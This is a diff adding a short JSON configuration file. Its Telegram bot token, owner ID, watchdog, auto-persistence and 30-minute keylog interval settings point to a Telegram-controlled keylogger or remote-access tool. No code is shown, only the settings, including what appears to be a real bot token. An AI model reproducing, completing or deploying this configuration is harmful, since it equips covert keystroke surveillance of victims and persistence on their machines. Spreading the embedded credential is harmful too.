@@ -1,0 +1,8 @@
+{
+    "bot_token": "8605714172:AAGOq2OayZx3tULCp8gzh7sAvCR42-ijX0A",
+    "owner_id": 8288882655,
+    "watchdog_enabled": true,
+    "auto_persist": true,
+    "keylog_interval_min": 30,
+    "debug": false
+}
